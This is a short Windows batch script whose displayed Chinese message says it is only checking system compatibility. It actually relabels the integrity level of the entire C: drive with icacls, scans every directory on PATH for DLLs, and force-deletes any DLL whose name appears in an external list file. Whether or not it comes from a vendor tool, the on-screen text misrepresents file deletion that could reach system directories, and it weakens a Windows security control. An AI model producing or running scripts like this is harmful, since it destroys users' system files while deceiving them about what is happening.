@echo off
echo 正在检查系统兼容性，不要关闭该窗口，检查结束后将自动关闭，请耐心等待......
echo.
icacls c: /setintegritylevel M
echo %PATH% >a.txt
del b.txt 2>nul
for /F "tokens=1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 delims=;" %%a in (a.txt) do (for %%v in ("%%a" "%%b" "%%c" "%%d" "%%e" "%%f" "%%g" "%%h" "%%i" "%%j" "%%k" "%%l" "%%m" "%%n" "%%o" "%%p" "%%q" "%%r" "%%s" "%%t") do (if %%~v neq %~dp0 (if %%~v\ neq %~dp0 (for %%a in (%%v\*.dll) do (echo %%a >>b.txt)))))
for /F %%i in (b.txt) do (for /F %%j in (dll.txt) do (if /I "%%~nj" == "%%~ni" (del /F /A /Q %%i)))